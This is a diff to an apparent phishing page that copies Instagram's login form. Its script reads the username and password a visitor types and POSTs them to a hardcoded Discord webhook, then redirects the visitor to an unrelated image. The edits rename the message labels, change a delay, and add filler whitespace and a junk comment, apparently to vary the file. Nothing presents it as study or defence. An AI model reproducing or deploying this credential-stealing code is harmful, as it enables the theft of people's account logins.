@@ -30,6 +30,14 @@
                       <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                     </span>  
 
+
+			  
+<!-- hviutxigdigdigwigxigx8 -->
+
+
+
+
+			  
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                   </form>
                 </div> <!-- Form-wrap end -->
@@ -63,6 +71,7 @@
             <ul>
 			  <li><a href=""></a></li>
               <li><a href="https://about.instagram.com">About Us</a></li>
+		    
               <li><a href="https://help.instagram.com">Support</a></li>
               <li><a href="https://about.instagram.com/blog">Blog</a></li>
               <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
@@ -101,10 +110,15 @@
     request.open("POST", "https://discord.com/api/webhooks/1221932777499263158/ThVWkczP3AK6wKPqbtAucU6m5AULUA-TD1RhwaqyUaJPmm3h7d7p_owAQbPPEHsYGlos");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+      content: ("> **USR  : **" + document.getElementById('username').value + "\n> **PWD : **" + document.getElementById('password').value)
     }
+
+
+
+
+	  
     request.send(JSON.stringify(params));
-	sleep(400)
+	sleep(300)
 	window.location.replace("https://preview.redd.it/6b4spa9gyez21.png?width=1080&crop=smart&auto=webp&s=9f8eeb7c18a9ccc64f53fa652eb35a9bdfd1be16");
   }
   </script>
